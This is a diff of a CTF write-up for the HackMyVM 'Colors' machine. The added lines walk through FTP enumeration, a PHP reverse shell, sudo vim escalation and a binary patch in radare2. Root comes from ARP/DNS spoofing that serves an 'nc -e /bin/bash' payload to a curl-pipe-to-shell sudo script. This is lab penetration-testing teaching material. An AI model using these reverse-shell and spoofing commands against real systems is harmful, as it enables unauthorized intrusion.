@@ -12,11 +12,15 @@
 
 <img src="https://hackmyvm.eu/img/vm/ez.png" alt="Colors Machine Logo" width="150"/>
 
-> Hey hacker, I've heard a lot about you and I've been told you're good.
-> 
-> The FBI has hacked into my apache server and shut down my website. I need you to sneak in and retrieve the "root.txt" file. I left my credentials somewhere but I can't remember where.
-> 
-> I will pay you well if you succeed, good luck hacker.
+#### Tools Used
+
+- arpspoof
+- CyberChef
+- dnsspoof
+- Netcat
+- Nmap
+- Radare2
+- Stegseek
 
 #### Machine Writeup
 
@@ -84,10 +88,12 @@ Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
 ```
 
 <div>
-	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
 	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
 </div>
+
 [Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
+
 [**#Anonymous login**]
 _anonymous : anonymous_ _anonymous :_ _ftp : ftp_
 ```
@@ -101,7 +107,6 @@ ftp <IP>
 ```
 
 `mkdir ./ftp_files && cd ./ftp_files`
-
 `ftp 192.168.56.130`:
 ```                  
 Connected to 192.168.56.130.
@@ -205,7 +210,7 @@ drwx------    2 1000     1000         4096 Feb 11  2023 .ssh ←
 226 Directory send OK.
 ```
 ```
-ftp> get note.txt
+ftp> get note.txt ←
 local: note.txt remote: note.txt
 229 Entering Extended Passive Mode (|||20566|)
 150 Opening BINARY mode data connection for note.txt (23 bytes).
@@ -306,10 +311,12 @@ ssh: connect to host 192.168.56.130 port 22: Connection refused ←
 ```
 
 <div>
-	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
 	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
 </div>
+
 [Pentesting IPv6](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/pentesting-ipv6)
+
 [**#Networks**]
 IPv6 addresses are structured to enhance network organization and device interaction. An IPv6 address is divided into:
 1. **Network Prefix**: The initial 48 bits, determining the network segment.
@@ -429,117 +436,490 @@ total 32
 4 -rwx------ 1 pink pink 3705 Feb 11  2023 .viminfo
 ```
 
-``:
+`ls -alps /var/www/html`:
+```
+total 828
+  4 drwxrwxrwx 2 www-data www-data   4096 Feb 11  2023 ./
+  4 drwxr-xr-x 3 root     root       4096 Jan 27  2023 ../
+  4 -rw-r--r-- 1 www-data www-data    295 Jan 27  2023 index.html
+ 12 -rw-r--r-- 1 www-data www-data  10701 Jan 27  2023 index.html.bak
+804 -rw-r--r-- 1 www-data www-data 821574 Jan 27  2023 seized.png
 ```
 
+`cd /var/www/html`
+`cat ./index.html`:
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <img src="./seized.png" alt="">
+</body>
+</html>
+```
+`cat ./index.html.bak`:
+```html
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+[...]
+
+        <div class="section_header section_header_red">
+          <div id="about"></div>
+          It works!
+        </div>
+        <div class="content_section_text">
+          <p>
+                This is the default welcome page used to test the correct 
+                operation of the Apache2 server after installation on Debian systems.
+                If you can read this page, it means that the Apache HTTP server installed at
+                this site is working properly. You should <b>replace this file</b> (located at
+                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
+          </p>
+
+
+          <p>
+                If you are a normal user of this web site and don't know what this page is
+                about, this probably means that the site is currently unavailable due to
+                maintenance.
+                If the problem persists, please contact the site's administrator.
+          </p>
+
+        </div>
+        <div class="section_header">
+          <div id="changes"></div>
+                Configuration Overview
+ 
+[...]
+
+        <div class="section_header">
+            <div id="docroot"></div>
+                Document Roots
+        </div>
+
+        <div class="content_section_text">
+            <p>
+                By default, Debian does not allow access through the web browser to
+                <em>any</em> file apart of those located in <tt>/var/www</tt>,
+                <a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html" rel="nofollow">public_html</a>
+                directories (when enabled) and <tt>/usr/share</tt> (for web
+                applications). If your site is using a web document root
+                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
+                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
+            </p>
+            <p>
+                The default Debian document root is <tt>/var/www/html</tt>. You
+                can make your own virtual hosts under /var/www. This is different
+                to previous releases which provides better security out of the box.
+            </p>
+        </div>
+
+[...]
+
+  </body>
+</html>
 ```
 
-``:
+`ls -ld ./`:
+```
+drwxrwxrwx 2 www-data www-data 4096 Feb 11  2023 /var/www/html ←
 ```
 
+`cat /etc/php/7.4/apache2/php.ini | grep 'disable_functions'`:
+```
+disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare, ←
 ```
 
-
-``:
+`nc -lnvp 4444 > ./revsh.php`:
 ```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
+listening on [any] 4444 ... ←
 ```
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
-``:
+`echo '<?php $sock = fsockopen("192.168.56.118", 5555); $proc = proc_open("/bin/bash", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>' | tee ./revsh.php`:
+```
+<?php $sock = fsockopen("192.168.56.118", 5555); $proc = proc_open("/bin/bash", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>
 ```
 
+🔄 Alternative Step.
+
+`msfvenom -p php/reverse_php LHOST=192.168.56.118 LPORT=5555 -f raw > ./revsh.php`:
+```
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 2997 bytes
 ```
 
-``:
-```
+`cat ./revsh.php | nc 192.168.56.130 4444`
+
+![Victim: pink](https://img.shields.io/badge/Victim-pink-64b5f6?logo=linux&logoColor=white)
 
 ```
-
-``:
+connect to [192.168.56.130] from (UNKNOWN) [192.168.56.118] 48604 ←
 ```
 
+`ls -alps ./`:
+```
+total 836
+  4 drwxrwxrwx 2 www-data www-data   4096 Oct  1 11:23 ./
+  4 drwxr-xr-x 3 root     root       4096 Jan 27  2023 ../
+  4 -rw-r--r-- 1 www-data www-data    295 Jan 27  2023 index.html
+ 12 -rw-r--r-- 1 www-data www-data  10701 Jan 27  2023 index.html.bak
+  4 -rw-r--r-- 1 pink     pink         20 Oct  1 09:23 info.php
+  4 -rw-r--r-- 1 pink     pink        135 Oct  1 11:23 revsh.php ←
+804 -rw-r--r-- 1 www-data www-data 821574 Jan 27  2023 seized.png
 ```
 
-``:
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+
+`nc -lnvp 5555`:
+```
+listening on [any] 5555 ... ←
 ```
 
+`curl http://192.168.56.130/revsh.php`
+
+```
+connect to [192.168.56.118] from (UNKNOWN) [192.168.56.130] 56566 ←
+```
+
+![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
+
+`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`
+
+`whoami`:
+```
+www-data ←
+```
+
+`id`:
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+`sudo -l`:
+```
+Matching Defaults entries for www-data on color:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on color:
+    (green) NOPASSWD: /usr/bin/vim ←
+```
+
+`ls -la /usr/bin/vim`:
+```
+lrwxrwxrwx 1 root root 21 Jan 27  2023 /usr/bin/vim -> /etc/alternatives/vim
+```
+
+`vim --version | grep -E 'python|lua'`:
+```
++comments          +libcall           -python            +visual
++conceal           +linebreak         -python3           +visualextra
++cursorshape       -lua               -ruby              +wildmenu
+```
+
+<div>
+	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
+	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
+</div>
+
+[vim](https://gtfobins.github.io/gtfobins/vim/)
+
+[**#Sudo**]
+If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+1. 
+```
+sudo vim -c ':!/bin/sh'
+```
+2. This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+```
+sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+3. This requires that `vim` is compiled with Lua support.
+```
+sudo vim -c ':lua os.execute("reset; exec sh")'
+```
+
+`sudo -u green vim -c ':!/bin/bash'`
+
+![Victim: green](https://img.shields.io/badge/Victim-green-64b5f6?logo=linux&logoColor=white)
+
+`whoami`:
+```
+green ←
+```
+
+`cd /home/green`
+`ls -alps`:
+```
+total 48
+ 4 drwx------ 2 green green  4096 Oct  1 11:10 ./
+ 4 drwxr-xr-x 6 root  root   4096 Jan 27  2023 ../
+ 0 lrwxrwxrwx 1 root  root      9 Feb 11  2023 .bash_history -> /dev/null
+ 4 -rwx------ 1 green green   220 Jan 27  2023 .bash_logout
+ 4 -rwx------ 1 green green  3526 Jan 27  2023 .bashrc
+ 4 -rwx------ 1 green green   807 Jan 27  2023 .profile
+ 4 -rw------- 1 green green   533 Oct  1 11:10 .viminfo
+ 4 -rw-r--r-- 1 root  root    145 Feb 11  2023 note.txt
+20 -rwxr-xr-x 1 root  root  16928 Feb 11  2023 test_4_green ←
+```
+
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+
+`nc -lnvp 6666 > ./test_4_green`:
+```
+listening on [any] 6666 ... ←
+```
+
+![Victim: green](https://img.shields.io/badge/Victim-green-64b5f6?logo=linux&logoColor=white)
+
+`cat ./test_4_green | nc 192.168.56.118 6666`
+
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+
+```
+connect to [192.168.56.118] from (UNKNOWN) [192.168.56.130] 77896 ←
+```
+
+`file ./test_4_green`:
+```
+test_4_green: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9496189c225509b7a26fbf1a874b3edeb9be0859, for GNU/Linux 3.2.0, not stripped ←
+```
+
+`strings ./test_4_green`:
+```
+[...]
+
+Guess the number im thinking: 
+Correct!! Here is the pass: ←
+Nope, sorry
+FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9YjmxTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23haAWAR7kxJC8METFFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23
+
+[...]
+```
+
+`r2 -w ./test_4_green`:
+```
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+[0x000010b0]> V ←
+```
+```
+p ←
+```
+```
+0x0000122b    488d3d90d00.            lea rdi, str.Guess_the_number_im_thinking:   ; 0x2008 ; "Guess the number im thinking: "
+0x00001232    b800000000              mov eax, 0
+0x00001234    e817ffffff              call sym.imp.printf                         ; [1]
+0x00001239    488d45f4                lea rax, [rbp - 0xc]
+0x0000123d    4899c6                  mov rsi, rax
+0x00001240    488d3de00d00.           lea rdi, [0x00002027]                       ; "%d"
+0x00001247    b800000000              mov eax, 0
+0x0000124c    e82ffffff               call sym.imp.__isoc99_scanf                 ; [2]
+0x00001251    8b45f4                  mov eax, dword [rbp - 0xc]
+0x00001254    3945f8                  cmp dword [rbp - 8], eax
+0x00001257    7572                    jne 0x12cb ←
+0x00001259    488d3dca0d00.           lea rdi, str.Correct___Here_is_the_pass:    ; 0x202a ; "Correct!! Here is the pass:" ←
+0x00001260    e8dbfdffff              call sym.imp.puts                           ; [3]
+```
+```
+[0x00001257 [xAdvc] 0 24% 230 ./test_4_green]> pd $r @ main+120 # 0x1257 ←
+	0x00001257      7572           jne 0x12cb ←
+	0x00001259      488d3dca0d00.  lea rdi, str.Correct___Here_is_the_pass:   ; 0x202a ; "Correct!! Here is the pass:"
+	0x00001260      e8dbfdffff     call sym.imp.puts
+```
+```
+Shift + a ←
+```
+```
+Write some x86-64 assembly...
+
+[VA:2]> je 0x12cb ←
+* 7472
+```
+```
+Save changes? (Y/n) Y ←
+```
+```
+q
+```
+
+`chmod +x ./test_4_green`
+`./test_4_green`:
+```
+Guess the number im thinking: 1
+Correct!! Here is the pass:
+purpleaslilas ←
+```
+
+![Victim: green](https://img.shields.io/badge/Victim-green-64b5f6?logo=linux&logoColor=white)
+
+`su purple`:
+```
+Password: ←
+```
+
+![Victim: purple](https://img.shields.io/badge/Victim-purple-64b5f6?logo=linux&logoColor=white)
+
+`whoami`:
+```
+purple ←
+```
+
+`cd /home/purple`
+`ls -alps`:
+```
+total 32
+4 drwx------ 2 purple purple 4096 Feb 20  2023 ./
+4 drwxr-xr-x 6 root   root   4096 Jan 27  2023 ../
+0 lrwxrwxrwx 1 root   root      9 Feb 11  2023 .bash_history -> /dev/null
+4 -rwx------ 1 purple purple  220 Jan 27  2023 .bash_logout
+4 -rwx------ 1 purple purple 3526 Jan 27  2023 .bashrc
+4 -rw-r--r-- 1 root   root     77 Feb 11  2023 for_purple_only.txt
+4 -rwx------ 1 purple purple  807 Jan 27  2023 .profile
+4 -rw-r--r-- 1 root   root     14 Feb 11  2023 user.txt ←
+4 -rw------- 1 purple purple  868 Feb 20  2023 .viminfo
+```
+
+`cat ./user.txt`:
+```
+(:Ez_Colors:) ←
+```
+
+`cat ./for_purple_only.txt `:
+```
+As the highest level user I allow you to use the supreme ddos attack script. ←
+```
+
+`sudo -l`:
+```
+Matching Defaults entries for purple on color:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User purple may run the following commands on color:
+    (root) NOPASSWD: /attack_dir/ddos.sh
+```
+
+`ls -la /attack_dir/ddos.sh`:
+```
+-rwxr--r-- 1 root root 75 Feb 11  2023 /attack_dir/ddos.sh ←
+```
+
+`cat /attack_dir/ddos.sh`:
+```
+#!/bin/bash
+/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p ←
+```
+
+`cat /etc/nsswitch.conf`:
+```
+# /etc/nsswitch.conf
+#
+# Example configuration of GNU Name Service Switch functionality.
+# If you have the `glibc-doc-reference' and `info' packages installed, try:
+# `info libc "Name Service Switch"' for information about this file.
+
+passwd:         files systemd
+group:          files systemd
+shadow:         files
+gshadow:        files
+
+hosts:          files dns ←
+networks:       files
+
+protocols:      db files
+services:       db files
+ethers:         db files
+rpc:            db files
+
+netgroup:       nis
+```
+
+`ls -la /etc/hosts`:
+```
+-rw-r--r-- 1 root root 185 Jan 27  2023 /etc/hosts ←
+```
+`cat /etc/hosts`:
+```
+127.0.0.1       localhost
+127.0.1.1       color
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+`ls -la /etc/resolv.conf`:
+```
+-rw-r--r-- 1 root root 48 Feb 20  2023 /etc/resolv.conf ←
+```
+`cat /etc/resolv.conf`:
+```
+nameserver 192.168.56.1 ←
+```
+
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+
+`mkdir ./http_server && cd ./http_server`
+`echo -e '#!/bin/bash\nnc -e /bin/bash 192.168.56.118 7777' | tee ./attack.sh`:
+```
+#!/bin/bash
+nc -e /bin/bash 192.168.56.118 7777
+```
+
+`python3 -m http.server 80`:
+```
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
+```
+
+`sudo arpspoof -i eth1 -t 192.168.56.30 192.168.56.1`:
+```
+8:0:27:9d:2e:ba 8:0:27:bf:d:e6 0806 42: arp reply 192.168.56.1 is-at 8:0:27:9d:2e:ba
+8:0:27:9d:2e:ba 8:0:27:bf:d:e6 0806 42: arp reply 192.168.56.1 is-at 8:0:27:9d:2e:ba
+8:0:27:9d:2e:ba 8:0:27:bf:d:e6 0806 42: arp reply 192.168.56.1 is-at 8:0:27:9d:2e:ba
+```
+
+`echo -e '192.168.56.118\tmasterddos.hmv' | tee ./fake_hosts.txt`:
+```                  
+192.168.56.118  masterddos.hmv
+```
+
+`dnsspoof -i eth1 -f ./fake_hosts.txt`:
+```
+dnsspoof: listening on eth1 [udp dst port 53 and not src 192.168.56.118] ←
+```
+
+`nc -lnvp 7777`:
+```
+listening on [any] 7777 ... ←
+```
+
+![Victim: purple](https://img.shields.io/badge/Victim-purple-64b5f6?logo=linux&logoColor=white)
+
+`curl http://masterddos.hmv/attack.sh`:
+```
+#!/bin/bash
+nc -e /bin/bash 192.168.56.118 7777
+```
+
+`sudo /attack_dir/ddos.sh`:
+```
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    47  100    47    0     0      3      0  0:00:15  0:00:15 --:--:--    11
+```
+
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+
+```
+connect to [192.168.1.160] from (UNKNOWN) [192.168.1.132] 56268 ←
 ```
 
 ![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)
@@ -559,12 +939,35 @@ uid=0(root) gid=0(root) grupos=0(root) ←
 `cd /root`
 `ls -alps`:
 ```
-
+total 40
+ 4 drwx------  4 root root  4096 Feb 20  2023 ./
+ 4 drwxr-xr-x 19 root root  4096 Feb 20  2023 ../
+ 0 lrwxrwxrwx  1 root root     9 Jan 31  2023 .bash_history -> /dev/null
+ 4 -rw-r--r--  1 root root   571 Apr 10  2021 .bashrc
+ 4 -rw-r--r--  1 root root   161 Jul  9  2019 .profile
+ 4 -rw-r--r--  1 root root   475 Feb 11  2023 root.txt ←
+ 4 drwx------  2 root root  4096 Feb 11  2023 .ssh/
+ 4 drwxr-xr-x  2 root root  4096 Feb 11  2023 .vim/
+12 -rw-------  1 root root 11088 Feb 20  2023 .viminfo
 ```
 
 `cat ./root.txt`:
 ```
- ←
+I hope you liked it :)
+
+Here, some chocolate and the flag:
+
+(:go_play_some_minecraft:) ←
+
+    ___  ___  ___  ___  ___.---------------.
+  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
+  |\/ __\/ __\/ __\/ __\/ _:\   |:.  \  \___ \
+   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
+    \\/ __\/ __\/ __\/ __\/ __:                \
+     \\'\__\'\__\'\__\ \__\'\_;-----------------`
+      \\/   \/   \/   \/   \/ :                 |
+       \|______________________;________________|
+
 ```
 
 <img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>
